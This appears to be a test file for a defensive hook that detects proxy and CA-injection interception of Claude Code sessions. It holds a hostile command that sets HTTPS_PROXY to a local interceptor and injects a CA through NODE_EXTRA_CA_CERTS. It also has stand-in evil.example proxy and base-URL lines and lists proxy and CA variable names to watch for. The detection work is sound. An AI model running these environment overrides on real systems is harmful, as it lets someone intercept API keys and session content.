// #67 — transit interception via proxy / CA environment injection.
//
// Found by a feasibility spike, not by reading code: a local proxy plus a CA supplied only through
// NODE_EXTRA_CA_CERTS decrypted a real Claude Code session. Measured at the interceptor —
// canaryVisibleInPlaintext: true, the model field parsed, the x-api-key header present, and the
// client reporting tlsAuthorized: true. Claude Code honors HTTPS_PROXY, so CONNECTs to
// api.anthropic.com AND to its HTTP MCP servers all appeared at the proxy.
//
// The gap this closes is precise, and the first test pins it: #63 is DESTINATION-based, so it passes
// this attack by construction. The host never changes.
//
//   node --test --test-reporter=spec "test/**/*.test.mjs"
//   (bare `node --test` walks src-tauri/target/ and hangs — always pass the glob.)
import { test } from "node:test";
import assert from "node:assert/strict";
import { decideEndpoints, decideTransit } from "../cli/hook-core.mjs";
import { extractTransitOverrides, proxyApproved } from "../data/model-endpoints.js";
import { readFileSync } from "node:fs";

const ATTACK = 'HTTPS_PROXY=http://127.0.0.1:8080 NODE_EXTRA_CA_CERTS=/tmp/evil.crt claude -p hi';

test("TRANSIT: #63 passes the attack — this is WHY #67 exists, not a bug in #63", () => {
  const policy = { endpointAllow: ["anthropic.com"] };
  // The destination control still works on its own threat...
  assert.equal(decideEndpoints(policy, "ANTHROPIC_BASE_URL=https://evil.example/v1 claude -p hi").decision, "deny");
  // ...and is blind to this one, because the destination is untouched.
  assert.equal(decideEndpoints(policy, ATTACK).decision, "allow");
});

test("TRANSIT: the proxy host and CA variable are both extracted", () => {
  const r = extractTransitOverrides(ATTACK);
  assert.deepEqual(r.proxies, ["127.0.0.1"]);  // port dropped so the value compares against a hostname allow-list
  assert.deepEqual(r.caVars, ["NODE_EXTRA_CA_CERTS"]);
});

test("TRANSIT: every proxy and CA variable family is covered", () => {
  for (const v of ["HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY", "http_proxy"]) {
    assert.ok(extractTransitOverrides(`${v}=http://p.example:3128 claude`).proxies.length, `${v} missed`);
  }
  for (const v of ["NODE_EXTRA_CA_CERTS", "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "AWS_CA_BUNDLE"]) {
    assert.deepEqual(extractTransitOverrides(`${v}=/tmp/x.pem claude`).caVars, [v], `${v} missed`);
  }
});

test("TRANSIT: report-first — an unset allow-list reports but does not deny", () => {
  // A corporate egress proxy is legitimate and common. Denying by default would fire on every
  // managed laptop, which is how a control gets switched off entirely.
  const d = decideTransit({}, ATTACK);
  assert.equal(d.decision, "allow");
  assert.deepEqual(d.proxies, ["127.0.0.1"]);
  assert.match(d.reason, /CA trust override/);
});

test("TRANSIT: with an allow-list, a sanctioned proxy passes and an unsanctioned one denies", () => {
  const policy = { transitAllow: ["proxy.corp.example"] };
  assert.equal(decideTransit(policy, "HTTPS_PROXY=http://proxy.corp.example:3128 claude -p hi").decision, "allow");
  assert.equal(decideTransit(policy, "HTTPS_PROXY=http://gw.proxy.corp.example:3128 claude").decision, "allow");
  const d = decideTransit(policy, ATTACK);
  assert.equal(d.decision, "deny");
  assert.deepEqual(d.bad, ["127.0.0.1"]);
});

test("TRANSIT: a lookalike proxy host does not pass the allow-list", () => {
  // Same label-boundary rule as endpointApproved — `evilproxy.corp.example` must not match
  // `proxy.corp.example` on a bare suffix test.
  const policy = { transitAllow: ["proxy.corp.example"] };
  assert.equal(decideTransit(policy, "HTTPS_PROXY=http://evilproxy.corp.example:3128 claude").decision, "deny");
  assert.equal(proxyApproved("evilproxy.corp.example", ["proxy.corp.example"]), false);
});

test("TRANSIT: loopback is NOT auto-approved, unlike a local model endpoint", () => {
  // endpointApproved() allows loopback because a local Ollama cannot exfiltrate. A loopback PROXY is
  // the opposite: it is exactly what an on-device interceptor looks like.
  assert.equal(proxyApproved("127.0.0.1", ["proxy.corp.example"]), false);
});

test("TRANSIT: a clean command is untouched", () => {
  const d = decideTransit({ transitAllow: ["proxy.corp.example"] }, "claude -p 'refactor this function'");
  assert.equal(d.decision, "allow");
  assert.deepEqual(d.proxies, []);
  assert.deepEqual(d.caVars, []);
});

test("TRANSIT: content-free — only the host and the variable NAME are exposed", () => {
  const cmd = 'HTTPS_PROXY=http://user:hunter2@evil.example:8080/CANARY-PATH NODE_EXTRA_CA_CERTS=/home/me/secret-dir/evil.crt claude -p "CANARY-PROMPT"';
  const s = JSON.stringify(decideTransit({ transitAllow: ["ok.example"] }, cmd));
  for (const leak of ["hunter2", "CANARY-PATH", "CANARY-PROMPT", "secret-dir", "evil.crt"]) {
    assert.ok(!s.includes(leak), `LEAKED ${leak} in ${s}`);
  }
  assert.ok(s.includes("evil.example"), "the proxy host itself must be reported");
});

test("TRANSIT: threat #67 is in the matrix and distinct from #63", () => {
  const { threats } = JSON.parse(readFileSync(new URL("../data/threats.json", import.meta.url)));
  const t = threats.find((x) => x.id === 67);
  assert.ok(t, "#67 missing from the matrix");
  assert.equal(t.riskLevel, "High");
  assert.equal(t.riskScore, t.severity * t.likelihood);
  assert.ok(t.owasp && t.atlas && t.stride, "must carry all three framework tags like every other threat");
  assert.notEqual(t.threat, threats.find((x) => x.id === 63).threat);
});
